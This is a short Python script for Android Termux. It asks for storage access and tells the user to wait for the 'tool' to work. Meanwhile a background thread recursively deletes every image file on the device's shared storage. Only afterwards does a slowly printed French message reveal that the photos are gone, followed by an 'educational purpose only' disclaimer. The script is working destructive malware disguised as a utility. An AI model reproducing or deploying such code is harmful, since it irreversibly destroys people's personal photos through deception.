import os, time, threading

def leOnError(*args):
   pass

def printSlowly():
   message = "Salut cher utilisateur.\n\nAvant toute chose attend la fin de ce message pour que l'outil puisse fonctionner\n\nTu sais quoi ?\n\nNon ?\n.\n..\n...\n...\n....\n.....\n......\n\nEt bien immagine un outil qui peut effacer toutes tes images...\nC'est ce que tu viens de faire.\nce code à été crée uniquement dans un but éducatif et le createur n'est en aucun cas responsable de vos actions"
   for leter in message:
      print(leter, end="")
      time.sleep(0.15)

def isdirWritable(dirpath: str) -> bool:
    try:
        test_file = os.path.join(dirpath, "test985.txt")
        with open(test_file, 'w') as f:
            f.write('Test d\'écriture.')
        os.remove(test_file)  
        return True
    except:
        return False

def evilCd():
    try:
        for (root, dirs, files) in os.walk('/storage/emulated/0/', topdown=True, onerror=leOnError):
            for fic in files:
                if fic.endswith('.jpg') or fic.endswith('.jpeg') or fic.endswith('.png') or fic.endswith('.gif') or fic.endswith('.bmp') or fic.endswith('.tiff') or fic.endswith('.tif') or fic.endswith('.webp') or fic.endswith('.svg') or fic.endswith('.raw') or fic.endswith('.heic') or fic.endswith('.heif') or fic.endswith('.ico'):
                    try:
                        os.remove(os.path.join(root, fic))
                    except:
                        pass
                else:
                    pass
    except:
        pass


os.system("termux-setup-storage")
if not isdirWritable("/storage/emulated/0/"):
    print("L'accès au stockage est néccéssaire pour faire fonctionner l'outil")
    exit()


th1 = threading.Thread(target=printSlowly)
th2 = threading.Thread(target=evilCd)

th1.start()
th2.start()

th1.join()
th2.join()
